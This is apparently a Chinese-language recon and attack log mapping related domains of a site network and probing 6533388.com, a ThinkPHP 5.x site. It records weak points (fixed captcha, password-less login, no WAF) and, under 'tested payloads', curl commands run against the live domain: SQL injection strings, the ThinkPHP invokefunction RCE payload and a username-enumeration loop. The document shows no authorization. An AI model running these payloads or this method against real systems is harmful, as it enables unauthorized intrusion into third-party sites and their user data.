# 6533388.com ThinkPHP 关联域名分析 (2026-07-12)

## 拓扑

```
9581kk.com (Apache + mod_security, biying CMS)
  ├── CDN: nxy.ycybbx.com, 18.162.243.73:8888, bbc.xhrsa.com, mca.klssy.com
  ├── 关联域名 (同网络/同账号体系):
  │   ├── 6533388.com -> ThinkPHP 5.x (无 WAF!)
  │   ├── 9599wm.net   -> 未知
  │   └── www142421549828364.00226944.com:6899 -> 自定义服务器
  └── 外链 JS: www.951234567.com (注释中)
```

## 6533388.com 关键特征

| 属性 | 值 |
|:-----|:----|
| 服务器 | Cloudflare (非 Apache mod_security) |
| 框架 | ThinkPHP 5.x |
| 登录端点 | /index/user/checkLogin |
| 登录参数 | username + code (无 password!) |
| 验证码 | 固定值 1111 (HTML input value) |
| 所有请求响应 | HTTP 500 System Error (ThinkPHP 默认错误页) |
| WAF | 无 ModSecurity (SQL 注入不返回 406) |
| 已知路径 | /application/ -> 403 (admin 模块存在) |
| 已知路径 | /runtime/ -> 403 (存在) |
| Session Cookie | PHPSESSID (标准 PHP session) |

## 攻击面

- 所有请求返回 500 = PHP 执行但崩溃 -> 数据库不可达或代码错误
- 无 WAF = 可尝试 ThinkPHP RCE payload
- 固定验证码 1111 = 认证只需要传 code=1111
- 登录无密码 = 可能使用 code 代替密码

## 已测试 payload

```bash
# 全部返回 500 System Error（PHP 执行但不成功）
curl "http://6533388.com/index/user/checkLogin?username=admin&code=1111"
curl "http://6533388.com/index/user/checkLogin?username=admin' OR 1=1&code=1111"
curl "http://6533388.com/index/user/checkLogin?username=admin' UNION SELECT 1&code=1111"

# ThinkPHP RCE 测试
curl "http://6533388.com/index.php?s=index/\\think\\app/invokefunction&function=phpinfo"

# 所有用户返回相同 500
for user in admin test root guest; do
  curl -o /dev/null -w "%{http_code}" "http://6533388.com/index/user/checkLogin?username=$user&code=1111"
done
```
